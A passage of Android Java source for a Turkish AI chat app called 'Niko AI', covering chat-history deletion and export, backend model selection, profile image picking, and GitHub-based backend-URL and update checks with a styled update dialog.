                        }
                    }
                    historyArray = newArray;
                }

                historyPrefs.edit().putString("data", historyArray.toString()).apply();
                
                runOnUiThread(() -> {
                    showHistory(edtHistorySearch.getText().toString());
                    Toast.makeText(this, "Anı silindi", Toast.LENGTH_SHORT).show();
                });

            } catch (Exception e) {
                e.printStackTrace();
                runOnUiThread(() -> Toast.makeText(this, "Silme hatası", Toast.LENGTH_SHORT).show());
            }
        }
    }

    /**
     * Tek bir geçmiş öğesini arayüz (UI) içine ekler.
     */
    private void deleteSingleHistoryItem(int index) {
        synchronized (historyLock) {
            try {
                String currentHistory = historyPrefs.getString("data", "[]");
                JSONArray historyArray = new JSONArray(currentHistory);

                if (index < 0 || index >= historyArray.length())
                    return;

                JSONObject entry = historyArray.getJSONObject(index);
                String messageSnippet = entry.optString("message", "");
                if (messageSnippet.length() > 40)
                    messageSnippet = messageSnippet.substring(0, 37) + "...";

                String finalSnippet = messageSnippet;
                runOnUiThread(() -> {
                    new android.app.AlertDialog.Builder(this, android.R.style.Theme_DeviceDefault_Dialog_Alert)
                            .setTitle("Mesajı Sil")
                            .setMessage("\"" + finalSnippet + "\"\n\nBu mesajı geçmişten silmek istiyor musunuz?")
                            .setIcon(android.R.drawable.ic_menu_delete)
                            .setPositiveButton("Sil", (dialog, which) -> {
                                new Thread(() -> {
                                    synchronized (historyLock) {
                                        try {
                                            String latestHistory = historyPrefs.getString("data", "[]");
                                            JSONArray latestArray = new JSONArray(latestHistory);

                                            if (index >= 0 && index < latestArray.length()) {
                                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                                                    latestArray.remove(index);
                                                } else {
                                                    JSONArray newList = new JSONArray();
                                                    for (int i = 0; i < latestArray.length(); i++) {
                                                        if (i != index)
                                                            newList.put(latestArray.get(i));
                                                    }
                                                    latestArray = newList;
                                                }
                                                historyPrefs.edit().putString("data", latestArray.toString()).apply();

                                                runOnUiThread(() -> {
                                                    showHistory(edtHistorySearch.getText().toString());
                                                    Toast.makeText(this, "Mesaj silindi", Toast.LENGTH_SHORT).show();
                                                });
                                            }
                                        } catch (Exception e) {
                                            e.printStackTrace();
                                        }
                                    }
                                }).start();
                            })
                            .setNegativeButton("Vazgeç", null)
                            .show();
                });
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    /**
     * Tüm geçmişi siler. (Thread-safe ve Gelişmiş UI Geri Bildirimi)
     */
    private void clearHistory() {
        // Zaten boşsa işlem yapma
        if (getHistoryCount() == 0) {
            Toast.makeText(this, "Temizlenecek bir geçmiş bulunamadı.", Toast.LENGTH_SHORT).show();
            return;
        }

        new android.app.AlertDialog.Builder(this, android.R.style.Theme_DeviceDefault_Dialog_Alert)
                .setTitle("Geçmişi Temizle")
                .setMessage("Tüm sohbet geçmişini silmek istediğinize emin misiniz? Bu işlem geri alınamaz.")
                .setIcon(android.R.drawable.ic_dialog_alert)
                .setPositiveButton("Hepsini Sil", (dialog, which) -> {
                    // Veri güvenliği için kilitleme kullan
                    synchronized (historyLock) {
                        historyPrefs.edit().clear().apply();
                    }

                    // Arayüzü güncelle
                    runOnUiThread(() -> {
                        containerHistoryItems.removeAllViews();
                        // Yeni boş durum görünümünü göster
                        if (layoutHistoryEmpty != null) {
                            layoutHistoryEmpty.setVisibility(View.VISIBLE);
                        }
                        // Stats kartlarını sıfırla
                        if (txtStatTotalChats != null) txtStatTotalChats.setText("0");
                        if (txtStatThisWeek != null) txtStatThisWeek.setText("0");
                        if (txtStatToday != null) txtStatToday.setText("0");
                        if (txtHistoryStats != null) {
                            txtHistoryStats.setText("SENKRONİZE • 0 KAYIT");
                        }
                        Toast.makeText(this, "Sohbet geçmişi tamamen temizlendi", Toast.LENGTH_SHORT).show();
                    });
                })
                .setNegativeButton("Vazgeç", null)
                .show();
    }

    /**
     * Sohbet geçmişini dışa aktarır (Panoya kopyalar ve/veya dosya olarak kaydeder).
     */
    private void exportHistory() {
        new Thread(() -> {
            synchronized (historyLock) {
                try {
                    String currentHistory = historyPrefs.getString("data", "[]");
                    JSONArray historyArray = new JSONArray(currentHistory);

                    if (historyArray.length() == 0) {
                        runOnUiThread(() -> Toast.makeText(this, "Dışa aktarılacak geçmiş bulunamadı.", Toast.LENGTH_SHORT).show());
                        return;
                    }

                    // Dışa aktarım için düzgün formatlanmış metin oluştur
                    StringBuilder exportText = new StringBuilder();
                    exportText.append("=== NİKO AI SOHBET GEÇMİŞİ ===\n");
                    exportText.append("Dışa Aktarım Tarihi: ");
                    SimpleDateFormat dateFormat = new SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault());
                    exportText.append(dateFormat.format(new Date())).append("\n");
                    exportText.append("Toplam Mesaj: ").append(historyArray.length()).append("\n");
                    exportText.append("================================\n\n");

                    String lastDate = "";
                    for (int i = 0; i < historyArray.length(); i++) {
                        JSONObject entry = historyArray.getJSONObject(i);
                        String sender = entry.getString("sender");
                        String message = entry.getString("message");
                        String time = entry.optString("time", "--:--");
                        String entryDate = entry.optString("date", "");

                        // Tarih başlığı ekle
                        if (!entryDate.equals(lastDate) && !entryDate.isEmpty()) {
                            exportText.append("\n--- ").append(entryDate).append(" ---\n\n");
                            lastDate = entryDate;
                        }

                        exportText.append("[").append(time).append("] ");
                        exportText.append(sender).append(": ");
                        exportText.append(message).append("\n\n");
                    }

                    String exportString = exportText.toString();

                    // Panoya kopyala
                    runOnUiThread(() -> {
                        ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
                        ClipData clip = ClipData.newPlainText("niko_chat_export", exportString);
                        clipboard.setPrimaryClip(clip);
                        Toast.makeText(this, "📋 Geçmiş panoya kopyalandı! (" + historyArray.length() + " mesaj)", Toast.LENGTH_LONG).show();
                    });

                } catch (Exception e) {
                    e.printStackTrace();
                    runOnUiThread(() -> Toast.makeText(this, "Dışa aktarma başarısız oldu.", Toast.LENGTH_SHORT).show());
                }
            }
        }).start();
    }

    // ================= MODEL SEÇİMİ (MODEL SELECTION) =================
    private void showModels() {
        runOnUiThread(() -> {
            layoutModels.setVisibility(View.VISIBLE);
            layoutModels.setAlpha(0f);
            layoutModels.animate().alpha(1f).setDuration(300).start();
            fetchModels();
        });
    }

    /**
     * Model seçim panelini ekrandan yavaşça (fade-out) gizler.
     */
    private void hideModels() {
        runOnUiThread(() -> {
            layoutModels.animate().alpha(0f).setDuration(300).withEndAction(() -> {
                layoutModels.setVisibility(View.GONE);
            }).start();
        });
    }

    /**
     * Kullanılabilir yapay zeka modellerini sunucudan çeker.
     */
    private void fetchModels() {
        new Thread(() -> {
            try {
                URL url = new URL(API_BASE_URL + "/models");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.setRequestProperty("Accept", "application/json");
                conn.setRequestProperty("x-api-key", "test");
                conn.setConnectTimeout(10000);

                if (conn.getResponseCode() == 200) {
                    BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), "utf-8"));
                    StringBuilder sb = new StringBuilder();
                    String line;
                    while ((line = br.readLine()) != null) {
                        sb.append(line);
                    }
                    JSONObject response = new JSONObject(sb.toString());
                    JSONArray models = response.getJSONArray("models");

                    runOnUiThread(() -> {
                        containerModelItems.removeAllViews();
                        for (int i = 0; i < models.length(); i++) {
                            try {
                                String modelName = models.getString(i);

                                // HIDDEN_MODELS listesindekileri filtrele
                                boolean isHidden = false;
                                for (String hidden : HIDDEN_MODELS) {
                                    if (modelName.equals(hidden)) {
                                        isHidden = true;
                                        break;
                                    }
                                }

                                if (isHidden)
                                    continue;

                                addModelItemToUI(modelName);
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        }
                    });
                }
            } catch (Exception e) {
                e.printStackTrace();
                runOnUiThread(() -> Toast.makeText(this, "Modeller alınamadı", Toast.LENGTH_SHORT).show());
            }
        }).start();
    }

    /**
     * Model kimliklerini (ID) kullanıcı dostu, temiz isimlere dönüştürür.
     */
    private String formatModelName(String modelId) {
        if (modelId == null || modelId.isEmpty())
            return "Bilinmeyen Model";

        // 1. Manuel Eşleştirmeler (Özel modeller için en temiz isimler)
        String lowerId = modelId.toLowerCase();
        if (lowerId.contains("doktorllama3"))
            return "Doktor Llama 3";
        if (lowerId.contains("warnchat"))
            return "Warnchat (12B)";
        if (lowerId.contains("kumru"))
            return "Kumru";
        if (lowerId.contains("turkish-gemma"))
            return "Turkish Gemma (9B)";
        if (lowerId.contains("rn_tr_r2"))
            return "Refined Neuro R2";
        if (lowerId.contains("gemma2:2b"))
            return "Gemma 2 (2B)";

        // 2. Genel Temizlik Algoritması
        String name = modelId;

        // Yazar/Klasör yolunu kaldır (örn: alibayram/...)
        if (name.contains("/")) {
            name = name.substring(name.lastIndexOf("/") + 1);
        }

        // Gereksiz tagları temizle
        name = name.replace(":latest", "");

        // Versiyon bilgisini parantez içine al (örn: llama3:8b -> Llama3 (8B))
        if (name.contains(":")) {
            String[] parts = name.split(":");
            if (parts.length > 1) {
                name = parts[0] + " (" + parts[1].toUpperCase() + ")";
            } else {
                name = parts[0];
            }
        }

        // Tire ve alt çizgileri temizle, kelimeleri büyük harfle başlat
        String[] words = name.split("[\\-_\\s]+");
        StringBuilder sb = new StringBuilder();
        for (String word : words) {
            if (!word.isEmpty()) {
                sb.append(Character.toUpperCase(word.charAt(0)));
                if (word.length() > 1)
                    sb.append(word.substring(1));
                sb.append(" ");
            }
        }

        return sb.toString().trim();
    }

    /**
     * Her modelin ne işe yaradığını basitçe açıklar.
     */
    private String getModelDescription(String modelId) {
        String lowerId = modelId.toLowerCase();
        if (lowerId.contains("doktorllama3"))
            return "Tıbbi sorular ve sağlık bilgisi için uzmanlaşmış model.";
        if (lowerId.contains("warnchat"))
            return "Mantık seviyesi yüksek, derinlemesine analiz yapan zeka.";
        if (lowerId.contains("kumru"))
            return "Akıcı ve son derece doğal Türkçe sohbet yeteneği.";
        if (lowerId.contains("turkish-gemma"))
            return "Geniş bilgi hazinesi ve dengeli Türkçe dil desteği.";
        if (lowerId.contains("rn_tr_r2"))
            return "Yaratıcı yazım ve akademik analiz için optimize edildi.";
        if (lowerId.contains("gemma2:2b"))
            return "Hızlı yanıt veren, genel amaçlı hafif asistan.";

        return "Genel amaçlı yapay zeka yardımcısı.";
    }

    /**
     * Model listesine yeni bir model öğesi ekler.
     */
    private void addModelItemToUI(String modelName) {
        LinearLayout itemLayout = new LinearLayout(this);
        LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        layoutParams.setMargins(0, 0, 0, 16);
        itemLayout.setLayoutParams(layoutParams);
        itemLayout.setOrientation(LinearLayout.VERTICAL);
        itemLayout.setPadding(40, 32, 40, 32);
        itemLayout.setBackgroundResource(R.drawable.model_item_bg);
        itemLayout.setClickable(true);
        itemLayout.setFocusable(true);

        // Model İsmi (Başlık)
        TextView txtTitle = new TextView(this);
        txtTitle.setText(formatModelName(modelName));
        txtTitle.setTextColor(Color.WHITE);
        txtTitle.setTextSize(17);
        txtTitle.setTypeface(null, android.graphics.Typeface.BOLD);

        // Model Açıklaması
        TextView txtDesc = new TextView(this);
        txtDesc.setText(getModelDescription(modelName));
        txtDesc.setTextColor(Color.parseColor("#88FFFFFF"));
        txtDesc.setTextSize(13);
        txtDesc.setPadding(0, 8, 0, 0);
        txtDesc.setLineSpacing(6, 1.1f);

        // Seçili Durum Tasarımı
        if (modelName.equals(selectedModel)) {
            itemLayout.setSelected(true);
            txtTitle.setTextColor(Color.parseColor("#00E5FF"));
            txtDesc.setTextColor(Color.parseColor("#6600E5FF"));

            // Sağ üst köşeye bir onay ikonu
            txtTitle.setCompoundDrawablesWithIntrinsicBounds(0, 0, android.R.drawable.checkbox_on_background, 0);
            txtTitle.setCompoundDrawablePadding(16);
        }

        itemLayout.setOnClickListener(v -> {
            vibrateFeedback();
            selectModel(modelName);
        });

        itemLayout.addView(txtTitle);
        itemLayout.addView(txtDesc);
        containerModelItems.addView(itemLayout);
    }

    /**
     * Kullanılacak yapay zeka modelini seçer ve kaydeder.
     */
    private void selectModel(String modelName) {
        selectedModel = modelName;
        modelPrefs.edit().putString("selected_model", modelName).apply();
        txtCurrentModel.setText(formatModelName(modelName));

        // Ana ekrandaki etiketi güncelle
        txtMainActiveModel.setText(formatModelName(modelName));

        // speak("Model seçildi: " + modelName, false);

        hideModels();
    }

    /**
     * Web arama butonunun görsel durumunu günceller.
     */
    private void updateSearchIcons() {
        runOnUiThread(() -> {
            if (isWebSearchEnabled) {
                btnWebSearch.setColorFilter(Color.parseColor("#00E5FF"));
                btnWebSearch.setAlpha(1.0f);
            } else {
                btnWebSearch.setColorFilter(Color.parseColor("#44FFFFFF"));
                btnWebSearch.setAlpha(0.5f);
            }
        });
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == PICK_IMAGE_REQUEST && resultCode == RESULT_OK && data != null && data.getData() != null) {
            Uri imageUri = data.getData();
            try {
                Bitmap bitmap = MediaStore.Images.Media.getBitmap(this.getContentResolver(), imageUri);
                
                // Resmi makul bir boyuta küçült (Örn: 512x512)
                int width = bitmap.getWidth();
                int height = bitmap.getHeight();
                float scale = Math.min(512f / width, 512f / height);
                if (scale < 1) {
                    Matrix matrix = new Matrix();
                    matrix.postScale(scale, scale);
                    bitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height, matrix, true);
                }
                
                imgMainProfile.setImageBitmap(bitmap);
                imgMainProfile.clearColorFilter(); // Yeni seçilen resimdeki filtreyi temizle
                
                // Base64'e çevir
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                bitmap.compress(Bitmap.CompressFormat.JPEG, 70, baos);
                byte[] imageBytes = baos.toByteArray();
                selectedImageBase64 = "data:image/jpeg;base64," + Base64.encodeToString(imageBytes, Base64.NO_WRAP);
                
            } catch (Exception e) {
                e.printStackTrace();
                Toast.makeText(this, "Fotoğraf seçilemedi", Toast.LENGTH_SHORT).show();
            }
        }
    }

    /**
     * GitHub üzerindeki README dosyasından güncel API URL'sini çeker ve günceller.
     * Bu sayede backend tünel adresi değişse bile uygulama otomatik ayak uydurur.
     */
    private void updateApiUrlFromGithub() {
        new Thread(() -> {
            try {
                // GitHub üzerinden README dosyasının ham halini al
                URL url = new URL("https://raw.githubusercontent.com/Memati8383/niko-with-kiro/main/README.md");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);

                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    sb.append(line).append("\n");
                }
                reader.close();

                String content = sb.toString();
                // Regex: Güncel Tünel/API Adresi satırındaki parantez içindeki URL'yi bulur
                Pattern pattern = Pattern.compile("Güncel (?:Tünel|API) Adresi:.*?\\((https?://[^\\)]+)\\)");
                Matcher matcher = pattern.matcher(content);
                
                String latestUrl = null;
                while (matcher.find()) {
                    latestUrl = matcher.group(1); // En son eşleşeni al (genelde en alttaki en günceldir)
                }

                if (latestUrl != null && latestUrl.startsWith("http")) {
                    final String fetchedUrl = latestUrl;
                    API_BASE_URL = fetchedUrl;
                    addLog("[CONFIG] API URL güncellendi (GitHub): " + fetchedUrl);
                    
                    // Local belleğe kaydet ki bir sonraki açılışta internet olmasa da en son adresi bilsin
                    getSharedPreferences("app_settings", MODE_PRIVATE)
                            .edit()
                            .putString("api_url", fetchedUrl)
                            .apply();
                            
                    // android.util.Log.d("NIKO_CONFIG", "API URL GitHub üzerinden güncellendi: " + fetchedUrl);
                }
            } catch (Exception e) {
                // android.util.Log.e("NIKO_CONFIG", "GitHub'dan URL çekilirken hata oluştu: " + e.getMessage());
            }
        }).start();
    }

    // ================= OTOMATİK GÜNCELLEME (PREMIUM) =================

    private static final String GITHUB_RELEASES_API = "https://api.github.com/repos/Memati8383/niko-with-kiro/releases/latest";

    /**
     * Uygulama her açıldığında güncelleme kontrolü yapar.
     * 24 saat bekleme süresi KALDIRILDI - her açılışta kontrol yapılır.
     * Bilgiler GitHub Releases API'den otomatik çekilir.
     */
    private void checkForUpdates() {
        addLog("[UPDATE] Güncelleme kontrolü başlatılıyor...");
        
        new Thread(() -> {
            try {
                // 1. Önce version.json'dan sadece sürüm numarasını al
                URL versionUrl = new URL(GITHUB_VERSION_URL);
                HttpURLConnection versionConn = (HttpURLConnection) versionUrl.openConnection();
                versionConn.setConnectTimeout(10000);
                versionConn.setReadTimeout(10000);
                versionConn.setRequestProperty("Cache-Control", "no-cache");

                if (versionConn.getResponseCode() != 200) {
                    addLog("[UPDATE] version.json alınamadı: " + versionConn.getResponseCode());
                    return;
                }

                BufferedReader versionReader = new BufferedReader(new InputStreamReader(versionConn.getInputStream()));
                StringBuilder versionSb = new StringBuilder();
                String line;
                while ((line = versionReader.readLine()) != null) versionSb.append(line);
                versionReader.close();

                JSONObject versionInfo = new JSONObject(versionSb.toString());
                latestVersion = versionInfo.optString("version", "1.0.0");

                String currentVersion = getCurrentVersion();
                addLog("[UPDATE] Mevcut: " + currentVersion + " | Sunucu: " + latestVersion);

                // Güncelleme gerekli mi kontrol et
                if (compareVersions(latestVersion, currentVersion) <= 0) {
                    addLog("[UPDATE] Uygulama güncel.");
                    return;
                }

                // 2. Güncelleme varsa, GitHub Releases API'den detayları çek
                addLog("[UPDATE] Yeni sürüm bulundu, detaylar çekiliyor...");
                fetchReleaseDetails();

            } catch (Exception e) {
                addLog("[UPDATE] Hata: " + e.getMessage());
                // android.util.Log.e("NIKO_UPDATE", "Hata: " + e.getMessage());
            }
        }).start();
    }

    /**
     * GitHub Releases API'den güncelleme detaylarını çeker.
     * description, changelog ve APK boyutunu otomatik alır.
     */
    private void fetchReleaseDetails() {
        try {
            URL releaseUrl = new URL(GITHUB_RELEASES_API);
            HttpURLConnection releaseConn = (HttpURLConnection) releaseUrl.openConnection();
            releaseConn.setConnectTimeout(10000);
            releaseConn.setReadTimeout(10000);
            releaseConn.setRequestProperty("Accept", "application/vnd.github.v3+json");
            releaseConn.setRequestProperty("User-Agent", "NikoApp");

            if (releaseConn.getResponseCode() != 200) {
                addLog("[UPDATE] GitHub API yanıt vermedi: " + releaseConn.getResponseCode());
                // API başarısız olsa bile varsayılan değerlerle devam et
                updateDescription = "Yeni özellikler ve iyileştirmeler";
                updateChangelog = "";
                updateFileSize = 0;
                runOnUiThread(this::showPremiumUpdateDialog);
                return;
            }

            BufferedReader releaseReader = new BufferedReader(new InputStreamReader(releaseConn.getInputStream()));
            StringBuilder releaseSb = new StringBuilder();
            String line;
            while ((line = releaseReader.readLine()) != null) releaseSb.append(line);
            releaseReader.close();

            JSONObject releaseInfo = new JSONObject(releaseSb.toString());

            // Release başlığı ve açıklaması
            String releaseName = releaseInfo.optString("name", "");
            String releaseBody = releaseInfo.optString("body", "");

            // Markdown işaretlerini temizle
            releaseBody = cleanMarkdown(releaseBody);

            // İlk satırı description olarak kullan, geri kalanı changelog
            if (!releaseBody.isEmpty()) {
                String[] bodyParts = releaseBody.split("\n", 2);
                updateDescription = bodyParts[0].trim();
                if (bodyParts.length > 1) {
                    String rawChangelog = bodyParts[1].trim();
                    // Changelog'u maksimum 500 karakterle sınırla
                    if (rawChangelog.length() > 500) {
                        rawChangelog = rawChangelog.substring(0, 497) + "...";
                    }
                    updateChangelog = rawChangelog;
                } else {
                    updateChangelog = "";
                }
            } else if (!releaseName.isEmpty()) {
                updateDescription = releaseName;
                updateChangelog = "";
            } else {
                updateDescription = "Yeni özellikler ve iyileştirmeler";
                updateChangelog = "";
            }


            // APK dosyasının boyutunu bul (assets içinden)
            updateFileSize = 0;
            JSONArray assets = releaseInfo.optJSONArray("assets");
            if (assets != null) {
                for (int i = 0; i < assets.length(); i++) {
                    JSONObject asset = assets.getJSONObject(i);
                    String assetName = asset.optString("name", "").toLowerCase();
                    if (assetName.endsWith(".apk")) {
                        updateFileSize = asset.optLong("size", 0);
                        addLog("[UPDATE] APK boyutu: " + (updateFileSize / 1024) + " KB");
                        break;
                    }
                }
            }

            addLog("[UPDATE] Detaylar alındı - Açıklama: " + updateDescription.substring(0, Math.min(50, updateDescription.length())) + "...");
            runOnUiThread(this::showPremiumUpdateDialog);

        } catch (Exception e) {
            addLog("[UPDATE] Release detayları alınamadı: " + e.getMessage());
            // Hata olsa bile varsayılan değerlerle dialog göster
            updateDescription = "Yeni sürüm mevcut: " + latestVersion;
            updateChangelog = "";
            updateFileSize = 0;
            runOnUiThread(this::showPremiumUpdateDialog);
        }
    }

    /**
     * Markdown işaretlerini temizler.
     * Başlıklar, linkler, bold/italic gibi formatları kaldırır.
     */
    private String cleanMarkdown(String text) {
        if (text == null || text.isEmpty()) return "";
        
        String cleaned = text;
        
        // Başlıkları temizle (# ## ### vb.)
        cleaned = cleaned.replaceAll("(?m)^#+\\s*", "");
        
        // Bold ve italic işaretlerini temizle (**text** veya *text* veya __text__ veya _text_)
        cleaned = cleaned.replaceAll("\\*\\*(.+?)\\*\\*", "$1");
        cleaned = cleaned.replaceAll("\\*(.+?)\\*", "$1");
        cleaned = cleaned.replaceAll("__(.+?)__", "$1");
        cleaned = cleaned.replaceAll("_(.+?)_", "$1");
        
        // Linkleri temizle [text](url) -> text
        cleaned = cleaned.replaceAll("\\[(.+?)\\]\\(.+?\\)", "$1");
        
        // Kod bloklarını temizle
        cleaned = cleaned.replaceAll("```[\\s\\S]*?```", "");
        cleaned = cleaned.replaceAll("`(.+?)`", "$1");
        
        // Yatay çizgileri temizle (--- veya ***)
        cleaned = cleaned.replaceAll("(?m)^[-*]{3,}$", "");
        
        // Resim etiketlerini temizle ![alt](url)
        cleaned = cleaned.replaceAll("!\\[.*?\\]\\(.*?\\)", "");
        
        // Tablo işaretlerini temizle
        cleaned = cleaned.replaceAll("\\|", " ");
        
        // Birden fazla boş satırı tek satıra indir
        cleaned = cleaned.replaceAll("\\n{3,}", "\n\n");
        
        // Satır başındaki ve sonundaki boşlukları temizle
        cleaned = cleaned.trim();
        
        return cleaned;
    }

    private String getCurrentVersion() {
        try {
            return getPackageManager().getPackageInfo(getPackageName(), 0).versionName;
        } catch (Exception e) {
            return "1.0.0";
        }
    }

    private int compareVersions(String v1, String v2) {
        try {
            String[] p1 = v1.split("\\.");
            String[] p2 = v2.split("\\.");
            int len = Math.max(p1.length, p2.length);
            for (int i = 0; i < len; i++) {
                int n1 = i < p1.length ? Integer.parseInt(p1[i].replaceAll("[^0-9]", "")) : 0;
                int n2 = i < p2.length ? Integer.parseInt(p2[i].replaceAll("[^0-9]", "")) : 0;
                if (n1 != n2) return n1 - n2;
            }
        } catch (Exception e) {
            return 0;
        }
        return 0;
    }

    /**
     * Premium tasarımlı güncelleme dialogu.
     * Modern, glassmorphism tarzı, animasyonlu.
     * Ultra premium tasarım: pulse animasyonlar, gradient efektler, gölgeler.
     */
    private void showPremiumUpdateDialog() {
        String skipped = updatePrefs.getString("skipped_version", "");
        if (skipped.equals(latestVersion)) {
            addLog("[UPDATE] Sürüm " + latestVersion + " atlanmış, dialog gösterilmiyor.");
            return;
        }

        // Dialog oluştur
        updateDialog = new android.app.Dialog(this, android.R.style.Theme_DeviceDefault_Dialog_NoActionBar);
        updateDialog.setCancelable(true);
        updateDialog.setCanceledOnTouchOutside(true);

        // ScrollView wrapper (uzun changelog için)
        android.widget.ScrollView scrollView = new android.widget.ScrollView(this);
        scrollView.setVerticalScrollBarEnabled(false);
        scrollView.setOverScrollMode(View.OVER_SCROLL_NEVER);

        // Ana container
        LinearLayout mainLayout = new LinearLayout(this);
        mainLayout.setOrientation(LinearLayout.VERTICAL);
        mainLayout.setPadding(56, 48, 56, 40);
        
        // Premium Glassmorphism arka plan
        android.graphics.drawable.GradientDrawable bgGradient = new android.graphics.drawable.GradientDrawable();
        bgGradient.setShape(android.graphics.drawable.GradientDrawable.RECTANGLE);
        bgGradient.setCornerRadius(40);
        bgGradient.setColors(new int[]{
            Color.parseColor("#1E1E32"),
            Color.parseColor("#12121F"),
            Color.parseColor("#0A0A14")
        });
        bgGradient.setOrientation(android.graphics.drawable.GradientDrawable.Orientation.TL_BR);
        bgGradient.setStroke(2, Color.parseColor("#2200E5FF"));
        mainLayout.setBackground(bgGradient);
        
        // Elevation efekti
        mainLayout.setElevation(32);

        // ===== HEADER BÖLÜMÜ =====
        android.widget.FrameLayout headerFrame = new android.widget.FrameLayout(this);
        LinearLayout.LayoutParams headerFrameParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        headerFrameParams.setMargins(0, 0, 0, 28);
        headerFrame.setLayoutParams(headerFrameParams);

        LinearLayout headerLayout = new LinearLayout(this);
        headerLayout.setOrientation(LinearLayout.HORIZONTAL);
        headerLayout.setGravity(android.view.Gravity.CENTER_VERTICAL);

        // Premium İkon Container (Pulse & Glow efekti)
        android.widget.FrameLayout iconContainer = new android.widget.FrameLayout(this);
        LinearLayout.LayoutParams iconContainerParams = new LinearLayout.LayoutParams(80, 80);
        iconContainerParams.setMargins(0, 0, 24, 0);
        iconContainer.setLayoutParams(iconContainerParams);

        // Dış glow katmanı (pulse animasyonu için)
        View glowRing = new View(this);
        android.widget.FrameLayout.LayoutParams glowParams = new android.widget.FrameLayout.LayoutParams(80, 80);
        glowRing.setLayoutParams(glowParams);
        android.graphics.drawable.GradientDrawable glowDrawable = new android.graphics.drawable.GradientDrawable();
        glowDrawable.setShape(android.graphics.drawable.GradientDrawable.OVAL);
        glowDrawable.setColor(Color.TRANSPARENT);
        glowDrawable.setStroke(4, Color.parseColor("#4400E5FF"));
        glowRing.setBackground(glowDrawable);
        iconContainer.addView(glowRing);

        // Pulse animasyonu
        android.animation.ObjectAnimator pulseAnimator = android.animation.ObjectAnimator.ofFloat(glowRing, "alpha", 1f, 0.3f, 1f);
        pulseAnimator.setDuration(2000);
        pulseAnimator.setRepeatCount(android.animation.ObjectAnimator.INFINITE);
        pulseAnimator.start();
        
        android.animation.ObjectAnimator scaleX = android.animation.ObjectAnimator.ofFloat(glowRing, "scaleX", 1f, 1.2f, 1f);
        android.animation.ObjectAnimator scaleY = android.animation.ObjectAnimator.ofFloat(glowRing, "scaleY", 1f, 1.2f, 1f);
        scaleX.setDuration(2000);
        scaleY.setDuration(2000);
        scaleX.setRepeatCount(android.animation.ObjectAnimator.INFINITE);
        scaleY.setRepeatCount(android.animation.ObjectAnimator.INFINITE);
        scaleX.start();
        scaleY.start();

        // Ana ikon (gradient daire + ok simgesi)
        TextView iconView = new TextView(this);
        android.widget.FrameLayout.LayoutParams iconViewParams = new android.widget.FrameLayout.LayoutParams(64, 64);
        iconViewParams.gravity = android.view.Gravity.CENTER;
        iconView.setLayoutParams(iconViewParams);
        iconView.setText("⬆");
        iconView.setTextSize(28);
        iconView.setGravity(android.view.Gravity.CENTER);
        iconView.setTextColor(Color.WHITE);
        android.graphics.drawable.GradientDrawable iconBg = new android.graphics.drawable.GradientDrawable();
        iconBg.setShape(android.graphics.drawable.GradientDrawable.OVAL);
        iconBg.setColors(new int[]{Color.parseColor("#00E5FF"), Color.parseColor("#00B4D8"), Color.parseColor("#0080FF")});
        iconBg.setGradientType(android.graphics.drawable.GradientDrawable.RADIAL_GRADIENT);
        iconBg.setGradientRadius(64);
        iconView.setBackground(iconBg);
        iconView.setElevation(8);
        iconContainer.addView(iconView);

        // Bounce animasyonu (ikon için)
        android.animation.ObjectAnimator bounceAnim = android.animation.ObjectAnimator.ofFloat(iconView, "translationY", 0f, -8f, 0f);
        bounceAnim.setDuration(1500);
        bounceAnim.setRepeatCount(android.animation.ObjectAnimator.INFINITE);
        bounceAnim.setInterpolator(new android.view.animation.AccelerateDecelerateInterpolator());
        bounceAnim.start();

        headerLayout.addView(iconContainer);

        // Başlık metinleri
        LinearLayout titleContainer = new LinearLayout(this);
        titleContainer.setOrientation(LinearLayout.VERTICAL);

        // "YENİ GÜNCELLEME" etiketi
        TextView txtUpdateLabel = new TextView(this);
        txtUpdateLabel.setText("✨ YENİ GÜNCELLEME MEV­CUT");
        txtUpdateLabel.setTextColor(Color.parseColor("#00E5FF"));
        txtUpdateLabel.setTextSize(11);
        txtUpdateLabel.setLetterSpacing(0.2f);
        txtUpdateLabel.setTypeface(android.graphics.Typeface.create("sans-serif-medium", android.graphics.Typeface.BOLD));
        txtUpdateLabel.setPadding(0, 0, 0, 6);
        titleContainer.addView(txtUpdateLabel);

        // Sürüm numarası (büyük)
        TextView txtVersionTitle = new TextView(this);
        txtVersionTitle.setText("Sürüm " + latestVersion);
        txtVersionTitle.setTextColor(Color.WHITE);
        txtVersionTitle.setTextSize(26);
        txtVersionTitle.setTypeface(android.graphics.Typeface.create("sans-serif-black", android.graphics.Typeface.BOLD));
        txtVersionTitle.setShadowLayer(12, 0, 0, Color.parseColor("#4400E5FF"));
        titleContainer.addView(txtVersionTitle);

        headerLayout.addView(titleContainer);
        headerFrame.addView(headerLayout);
        mainLayout.addView(headerFrame);

        // ===== SÜRÜM KARŞILAŞTIRMASI =====
        LinearLayout versionCompare = new LinearLayout(this);
        versionCompare.setOrientation(LinearLayout.HORIZONTAL);
        versionCompare.setGravity(android.view.Gravity.CENTER_VERTICAL);
        LinearLayout.LayoutParams versionCompareParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        versionCompareParams.setMargins(0, 0, 0, 24);
        versionCompare.setLayoutParams(versionCompareParams);
        versionCompare.setPadding(20, 16, 20, 16);
        
        // Version chip arka planı
